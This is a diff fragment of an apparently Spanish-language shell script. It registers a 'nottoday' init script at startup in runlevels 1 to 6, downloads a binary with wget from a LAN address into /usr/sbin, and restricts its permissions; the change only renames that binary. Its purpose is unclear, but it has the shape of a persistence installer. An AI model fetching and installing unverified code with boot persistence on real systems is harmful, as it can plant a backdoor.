@@ -10,9 +10,9 @@ for i in `seq 1 6`;do
 	ln -s /etc/init.d/nottoday /etc/rc$i.d/S01nottoday
 done
 
-wget http://192.168.0.24/tumama -O /usr/sbin/tumama
+wget http://192.168.0.24/principal -O /usr/sbin/principal
 
-chmod 700 /usr/sbin/tumama
+chmod 700 /usr/sbin/principal
 
 #Levantando servidor
 
